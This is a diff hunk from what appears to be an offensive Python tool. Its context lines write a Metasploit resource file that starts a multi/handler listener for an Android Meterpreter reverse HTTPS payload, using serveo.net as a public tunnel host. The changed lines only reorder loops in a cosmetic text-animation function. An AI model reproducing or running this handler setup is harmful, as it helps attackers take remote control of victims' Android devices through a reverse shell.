@@ -26,8 +26,8 @@ with open('automate.rc', 'w') as f:
  f.write(f'use exploit/multi/handler\nset payload android/meterpreter/reverse_https\nset LHOST serveo.net\nset LPORT {port}')
 
 def animate():
- for c in cycle:
-  for n in range(len(list)):
+ for n in range(len(list)):
+  for c in cycle:
    old = list[n]
    list[n] = old.upper()
    final = "".join(list)
